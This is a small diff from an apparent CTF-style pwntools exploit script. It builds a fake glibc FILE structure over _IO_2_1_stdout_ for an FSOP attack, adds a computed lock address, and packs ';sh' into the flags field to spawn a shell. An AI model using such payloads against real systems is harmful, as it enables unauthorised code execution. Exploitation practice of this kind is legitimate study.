@@ -23,6 +23,7 @@ def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
     return FSOP
 
 fake_fsop_struct = l.sym['_IO_2_1_stdout_']
+stdout_lock = fake_fsop_struct + 0x110
 FSOP = FSOP_struct(
 	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
 	lock=stdout_lock,
